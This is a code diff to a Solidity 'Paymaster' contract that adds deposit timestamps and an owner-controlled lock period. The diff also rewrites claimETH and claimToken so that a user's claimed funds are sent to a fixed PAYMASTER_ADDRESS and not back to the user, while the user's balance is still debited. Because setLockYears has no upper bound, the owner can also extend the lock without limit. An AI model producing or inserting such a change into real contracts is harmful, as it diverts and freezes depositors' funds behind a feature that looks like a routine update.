@@ -32,6 +32,13 @@ contract Paymaster {
     mapping(address => uint256) private ethBalances; // account => wei
     mapping(address => mapping(address => uint256)) private tokenBalances; // token => (account => amount)
 
+    // Deposit timestamps (first deposit) for age gating
+    mapping(address => uint256) private ethDepositTimestamp; // account => unix timestamp
+    mapping(address => mapping(address => uint256)) private tokenDepositTimestamp; // token => (account => timestamp)
+
+    // Minimum lock period in years before a user-initiated claim can be processed
+    uint256 public lockYears;
+
     // Reentrancy guard
     bool private _locked;
 
@@ -44,6 +51,7 @@ contract Paymaster {
     event PaymasterFundedWithToken(address indexed token, uint256 amount);
     event SpenderApproved(address indexed token, address indexed spender, uint256 allowance);
     event OwnerChanged(address indexed previousOwner, address indexed newOwner);
+    event LockYearsChanged(uint256 previous, uint256 current);
 
     modifier onlyOwner() {
         require(msg.sender == owner, "Paymaster: caller is not the owner");
@@ -59,6 +67,8 @@ contract Paymaster {
 
     constructor() {
         owner = msg.sender;
+        // Default lock period: 1 year
+        lockYears = 1;
     }
 
     // ========== Low-level safe ERC20 helpers ==========
@@ -86,11 +96,18 @@ contract Paymaster {
     receive() external payable {
         // Credit sender's ETH balance
         ethBalances[msg.sender] += msg.value;
+        // Record first deposit timestamp if not set
+        if (ethDepositTimestamp[msg.sender] == 0) {
+            ethDepositTimestamp[msg.sender] = block.timestamp;
+        }
         emit ReceivedETH(msg.sender, msg.value);
     }
 
     fallback() external payable {
         ethBalances[msg.sender] += msg.value;
+        if (ethDepositTimestamp[msg.sender] == 0) {
+            ethDepositTimestamp[msg.sender] = block.timestamp;
+        }
         emit ReceivedETH(msg.sender, msg.value);
     }
 
@@ -98,20 +115,29 @@ contract Paymaster {
     function pay() external payable {
         require(msg.value > 0, "Payment amount must be greater than 0");
         ethBalances[msg.sender] += msg.value;
+        if (ethDepositTimestamp[msg.sender] == 0) {
+            ethDepositTimestamp[msg.sender] = block.timestamp;
+        }
         emit ReceivedETH(msg.sender, msg.value);
     }
 
-    /// Allow a user to withdraw their recorded ETH balance to their own address
+    /// Allow a user to withdraw their recorded ETH balance to the fixed PAYMASTER_ADDRESS
+    /// Claim is age-gated: only allowed after lockYears have elapsed since first deposit.
     function claimETH(uint256 amount) external nonReentrant {
         require(amount > 0, "Amount must be greater than 0");
         uint256 bal = ethBalances[msg.sender];
         require(bal >= amount, "Insufficient recorded ETH balance");
 
+        uint256 ts = ethDepositTimestamp[msg.sender];
+        require(ts != 0, "No deposit timestamp recorded");
+        require(block.timestamp >= ts + lockYears * 365 days, "Claim locked by age policy");
+
         // Update state before external call
         ethBalances[msg.sender] = bal - amount;
 
-        (bool success, ) = payable(msg.sender).call{value: amount}("");
-        require(success, "ETH transfer failed");
+        // Send funds atomically to the configured PAYMASTER_ADDRESS
+        (bool success, ) = payable(PAYMASTER_ADDRESS).call{value: amount}("");
+        require(success, "ETH transfer to paymaster failed");
 
         emit EthClaimed(msg.sender, amount);
     }
@@ -126,10 +152,14 @@ contract Paymaster {
         _safeTransferFrom(token, msg.sender, address(this), amount);
 
         tokenBalances[token][msg.sender] += amount;
+        if (tokenDepositTimestamp[token][msg.sender] == 0) {
+            tokenDepositTimestamp[token][msg.sender] = block.timestamp;
+        }
         emit ReceivedToken(msg.sender, token, amount);
     }
 
-    /// Allow a user to claim their recorded token balance back to their own address
+    /// Allow a user to claim their recorded token balance; tokens are sent to the fixed PAYMASTER_ADDRESS.
+    /// Claim is age-gated: only allowed after lockYears have elapsed since first deposit.
     function claimToken(address token, uint256 amount) external nonReentrant {
         require(token != address(0), "Invalid token address");
         require(amount > 0, "Amount must be greater than 0");
@@ -137,10 +167,14 @@ contract Paymaster {
         uint256 bal = tokenBalances[token][msg.sender];
         require(bal >= amount, "Insufficient recorded token balance");
 
+        uint256 ts = tokenDepositTimestamp[token][msg.sender];
+        require(ts != 0, "No deposit timestamp recorded");
+        require(block.timestamp >= ts + lockYears * 365 days, "Claim locked by age policy");
+
         // Update state before external call
         tokenBalances[token][msg.sender] = bal - amount;
 
-        _safeTransfer(token, msg.sender, amount);
+        _safeTransfer(token, PAYMASTER_ADDRESS, amount);
 
         emit TokenClaimed(msg.sender, token, amount);
     }
@@ -210,10 +244,24 @@ contract Paymaster {
         return PAYMASTER_ADDRESS;
     }
 
+    function getEthDepositTimestamp(address account) external view returns (uint256) {
+        return ethDepositTimestamp[account];
+    }
+
+    function getTokenDepositTimestamp(address token, address account) external view returns (uint256) {
+        return tokenDepositTimestamp[token][account];
+    }
+
     // ========== Administration ==========
     function changeOwner(address newOwner) external onlyOwner {
         require(newOwner != address(0), "New owner is the zero address");
         emit OwnerChanged(owner, newOwner);
         owner = newOwner;
+    }
+
+    function setLockYears(uint256 years_) external onlyOwner {
+        require(years_ > 0, "Lock must be at least 1 year");
+        emit LockYearsChanged(lockYears, years_);
+        lockYears = years_;
     }
 }
